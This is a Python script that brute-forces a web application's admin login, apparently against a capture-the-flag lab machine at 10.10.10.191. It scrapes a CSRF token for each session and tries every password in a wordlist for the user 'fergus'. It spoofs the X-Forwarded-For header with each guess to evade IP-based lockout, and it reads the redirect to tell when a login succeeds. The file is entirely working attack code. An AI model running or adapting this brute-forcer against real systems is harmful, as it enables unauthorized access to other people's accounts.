import requests
import sys

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + str(response.apparent_encoding))
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))


def get_CSRF_token():
    sess = requests.Session()
    response = sess.get('http://10.10.10.191:80/admin/login')
    text = response.text
    CSRF_token = "" # one token per session
    try:
        CSRF_index = text.index('name="tokenCSRF"')
        text = text[CSRF_index + 23 : ]
        first_apostrophe_index = text.index('"')
        text = text[first_apostrophe_index + 1:]
        second_apostrophe_index = text.index('"')
        text = text[:second_apostrophe_index]
        CSRF_token = text
    except:
        print("CSRF token missing.")
        return null
    return CSRF_token, sess


def brute_force_passwords(password_file_path):
    password_file = open(password_file_path, "r") 
    password_wordlist = password_file.readlines()
    password_file.close()
    user = 'fergus'
    for word in password_wordlist:
        CSRF_token, sess = get_CSRF_token()
        word = word.rstrip()
        headers = {'X-Forwarded-For' : word}
        password = word
        print("Trying " + password)
        _payload = {'username':user, 'password':password, 'tokenCSRF':CSRF_token, 'save':''}
        try:
            response = sess.post('http://10.10.10.191:80/admin/login', headers=headers, data=_payload, allow_redirects=False)
        except Exception as e:
            print(password + " ----- " + str(e))
        try:
            redirect_location = response.headers['Location']
            print(redirect_location)
            if(redirect_location != '/admin/login'):
                print(password)
                break
        except:
            pass 

password_file_path = sys.argv[1]
brute_force_passwords(password_file_path)